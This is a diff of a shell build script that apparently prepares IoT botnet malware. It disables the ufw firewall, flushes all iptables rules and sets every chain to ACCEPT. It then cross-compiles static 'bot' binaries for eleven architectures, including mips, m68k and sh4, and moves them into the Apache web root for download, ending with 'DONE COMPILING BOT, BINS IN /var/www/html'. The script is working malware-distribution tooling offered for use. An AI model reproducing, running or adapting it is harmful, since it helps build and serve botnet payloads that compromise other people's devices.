@@ -1,6 +1,18 @@
 ufw disable
 cd bot
+apt upgrade
 apt update -y
+
+sudo iptables -F
+sudo iptables -X
+sudo iptables -t nat -F
+sudo iptables -t nat -X
+sudo iptables -t mangle -F
+sudo iptables -t mangle -X
+sudo iptables -P INPUT ACCEPT
+sudo iptables -P OUTPUT ACCEPT
+sudo iptables -P FORWARD ACCEPT
+
 
 #setup http server if not installed
        
@@ -18,20 +30,22 @@ apt install gcc-aarch64-linux-gnu -y
 apt install gcc-m68k-linux-gnu -y
 apt install gcc-i686-linux-gnu -y
 apt install gcc-arm-linux-gnueabihf -y
+apt install gcc-sh4-linux-gnu -y
 
-powerpc64-linux-gnu-gcc -w -o powerpc64 -lpthread *.c
-mips-linux-gnu-gcc -w -o mips -lpthread *.c
-mipsel-linux-gnu-gcc -w -o mipsel -lpthread *.c
-sparc64-linux-gnu-gcc -w -o sparc -lpthread *.c
-arm-linux-gnueabi-gcc -w -o arm -lpthread *.c
-aarch64-linux-gnu-gcc -w -o aarch64 -lpthread *.c
-m68k-linux-gnu-gcc -w -o m68k -lpthread *.c
-i686-linux-gnu-gcc -w -o i686 -lpthread *.c
-arm-linux-gnueabihf-gcc -w -o armhf -lpthread *.c
-x86_64-linux-gnu-gcc -w -o x86_64 -lpthread *.c
+powerpc64-linux-gnu-gcc -static -pthread -DARCH_powerpc64 *.c -o powerpc64  
+mips-linux-gnu-gcc -static -pthread -DARCH_mips *.c -o mips  
+mipsel-linux-gnu-gcc -static -pthread -DARCH_mipsel *.c -o mipsel  
+sparc64-linux-gnu-gcc -static -pthread -DARCH_sparc *.c -o sparc  
+arm-linux-gnueabi-gcc -static -pthread -DARCH_arm *.c -o arm  
+aarch64-linux-gnu-gcc -static -pthread -DARCH_aarch64 *.c -o aarch64  
+m68k-linux-gnu-gcc -static -pthread -DARCH_m68k *.c -o m68k  
+i686-linux-gnu-gcc -static -pthread -DARCH_i686 *.c -o i686  
+arm-linux-gnueabihf-gcc -static -pthread -DARCH_arm *.c -o armhf  
+x86_64-linux-gnu-gcc -static -pthread -DARCH_x86_64 *.c -o x86_64  
+sh4-linux-gnu-gcc -static -pthread -DARCH_sh4 *.c -o sh4  
 
 #move binaries to apache2 dir
-mv mipsel mips i686 armhf aarch64 m68k arm sparc powerpc64 x86_64 /var/www/html
+mv mipsel mips i686 armhf aarch64 m68k arm sparc powerpc64 x86_64 sh4 /var/www/html
 
 cd ..
 echo "DONE COMPILING BOT, BINS IN /var/www/html"
